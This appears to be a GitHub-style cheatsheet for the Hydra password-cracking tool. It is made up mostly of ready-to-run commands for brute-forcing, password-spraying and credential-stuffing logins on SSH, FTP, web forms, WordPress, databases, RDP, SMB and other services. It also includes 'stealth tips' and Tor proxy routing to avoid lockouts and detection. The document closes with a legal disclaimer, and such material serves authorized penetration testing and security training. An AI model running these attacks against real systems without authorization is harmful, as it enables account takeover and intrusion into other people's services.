# 🔓 Hydra - Complete Cheatsheet

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    The Fast Network Login Cracker
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Brute Force">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Network">
</p>

<p align="center">
  <b>🔑 The most famous parallelized network login cracker</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Supported Protocols](#-supported-protocols)
- [SSH Attacks](#-ssh-attacks)
- [FTP Attacks](#-ftp-attacks)
- [HTTP Form Attacks](#-http-form-attacks)
- [Database Attacks](#-database-attacks)
- [Remote Desktop Attacks](#-remote-desktop-attacks)
- [Other Services](#-other-services)
- [Wordlists & Passwords](#-wordlists--passwords)
- [Advanced Options](#-advanced-options)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🎯 Introduction

**Hydra** (THC-Hydra) is a fast and flexible online password cracking tool. It supports numerous protocols and is parallelized for speed.

### Key Features

| Feature | Description |
|---------|-------------|
| **50+ Protocols** | SSH, FTP, HTTP, RDP, SMB, and more |
| **Parallelized** | Multiple simultaneous connections |
| **Flexible** | Custom headers, cookies, proxy |
| **Resume** | Save and restore attack sessions |
| **Cross-Platform** | Linux, Windows, macOS |

### Attack Types

| Type | Description |
|------|-------------|
| **Dictionary** | Try passwords from wordlist |
| **Brute Force** | Generate all combinations |
| **Password Spray** | Single password, multiple users |
| **Credential Stuffing** | Username:password pairs |

---

## 📥 Installation

### Kali Linux (Pre-installed)
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### From Source
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS (Homebrew)
```bash
brew install hydra
```

### Verify Installation
```bash
hydra -h
hydra -V
```

---

## ⌨️ Basic Syntax

### General Syntax
```bash
hydra [options] target service
```

### Common Options

| Option | Description |
|--------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password list |
| `-C` | Colon-separated file (user:pass) |
| `-t` | Threads (default: 16) |
| `-s` | Port number |
| `-o` | Output file |
| `-f` | Stop on first valid pair |
| `-V` | Verbose mode |
| `-vV` | Very verbose |
| `-d` | Debug mode |

### Quick Start
```bash
# Single user, password list
hydra -l admin -P passwords.txt target ssh

# User list, single password
hydra -L users.txt -p password123 target ssh

# Both lists
hydra -L users.txt -P passwords.txt target ssh
```

---

## 📡 Supported Protocols

### Complete Protocol List

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

## 🔐 SSH Attacks

### Basic SSH Attack
```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Specific port
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### SSH with Options
```bash
# Limit attempts (avoid lockout)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Stop on first success
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Verbose output
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### SSH Key Authentication
```bash
# Using private key (check weak keys)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

## 📂 FTP Attacks

### Basic FTP Attack
```bash
# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Anonymous FTP check
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Multiple users
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS (FTP over SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

## 🌐 HTTP Form Attacks

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Format:
# "/path:params:failure_string"
```

### HTTP-POST-FORM (Most Common)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Form Attack Syntax

```
"/page:POST_params:Failure_string"

Where:
- ^USER^ = Username placeholder
- ^PASS^ = Password placeholder
- Failure_string = Text shown on failed login
```

### Success-Based Detection

```bash
# Use S= for success string instead of failure
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### With Cookies

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### HTTP Basic Auth

```bash
# HTTP Basic Authentication
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### HTTP Proxy

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

## 🗄️ Database Attacks

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Specific port
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Oracle SID attack
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Oracle listener
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

## 🖥️ Remote Desktop Attacks

### RDP (Windows Remote Desktop)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Limit threads (RDP is slow)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC (password only)
hydra -P passwords.txt vnc://192.168.1.1

# VNC specific version
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

## 🔧 Other Services

### SMB (Windows Shares)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# SMTP authentication
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# SMTP Enumeration
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

## 📚 Wordlists & Passwords

### Popular Wordlists

```bash
# Kali Linux locations
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# SecLists passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### Password Generation (-x)

```bash
# Generate passwords: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 lowercase letters
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 uppercase letters
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 numbers
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Mixed

# Charset options:
# a = lowercase    A = uppercase
# 1 = numbers      ! = special chars
```

### Colon-Separated File (-C)

```bash
# user:password format
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### Username/Password Customization

```bash
# Null passwords
hydra -l admin -e n 192.168.1.1 ssh

# Try username as password
hydra -l admin -e s 192.168.1.1 ssh

# Try reversed username as password
hydra -l admin -e r 192.168.1.1 ssh

# All special checks
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

## ⚡ Advanced Options

### Output & Logging

```bash
# Save results to file
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# JSON output
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### Resume Attacks

```bash
# Save session for resuming
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Resume interrupted attack
hydra -R
```

### Proxy Support

```bash
# HTTP proxy
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# SOCKS proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### Performance Tuning

```bash
# Threads (default: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Wait time between attempts
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Connection timeout
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### Multiple Targets

```bash
# From file
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

## 🎬 Real-World Examples

### Example 1: SSH Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### Example 2: Web Login Form
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### Example 3: WordPress Login
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Example 4: Multiple Services
```bash
# Scan multiple services on one host
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### Example 5: Password Spray
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### Example 6: With Proxy/Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### Example 7: HTTP Basic Auth (Admin Panel)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### Example 8: RDP Attack (Careful!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

## 📊 Quick Reference

### Essential Commands

| Task | Command |
|------|---------|
| SSH attack | `hydra -l user -P pass.txt ssh://target` |
| FTP attack | `hydra -l user -P pass.txt ftp://target` |
| HTTP POST form | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| RDP attack | `hydra -l user -P pass.txt rdp://target` |
| Save output | `hydra ... -o results.txt` |
| Resume attack | `hydra -R` |

### Common Options

| Option | Description |
|--------|-------------|
| `-l/-L` | Username/list |
| `-p/-P` | Password/list |
| `-C` | user:pass file |
| `-t` | Threads |
| `-s` | Port |
| `-f` | Stop on success |
| `-V` | Verbose |
| `-o` | Output file |
| `-x` | Generate passwords |
| `-e nsr` | Try null/same/reverse |

---

## 💡 Tips & Best Practices

### Performance Tips

1. **Limit Threads for Sensitive Services**
   ```bash
   # RDP, SMB - use low threads
   hydra -t 1 ...
   
   # SSH - moderate
   hydra -t 4 ...
   
   # Web forms - can be higher
   hydra -t 16 ...
   ```

2. **Use Targeted Wordlists**
   ```bash
   # Better than rockyou.txt:
   # - Top 1000 passwords
   # - Default credentials
   # - Company-specific
   ```

3. **Check for Lockout Policies First**
   ```bash
   # Test with small wordlist first
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### Stealth Tips

```bash
# Add delays
hydra -l admin -P passwords.txt -w 30 target ssh

# Low threads
hydra -l admin -P passwords.txt -t 2 target ssh

# Through proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## ⚠️ Legal Disclaimer

> **WARNING:** Hydra is a powerful attack tool that should only be used for **authorized testing**.
> 
> - ✅ Test on systems you own
> - ✅ Test with explicit written permission
> - ✅ Use in authorized penetration tests
> - ❌ Never attack without authorization
> - ❌ Brute forcing is illegal without permission
> 
> **Unauthorized access attempts are illegal and may result in criminal charges.**

---

## 📚 Resources

### Official Resources
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Manual](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Default Credentials](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Related Cheatsheets
- [Nmap](../Nmap/README.md)
- [Metasploit](../Metasploit/README.md)
- [SQLMap](../SQLMap/README.md)

---

<p align="center">
  <b>🔓 Master Network Login Cracking!</b><br>
  <i>Always get authorization first</i>
</p>
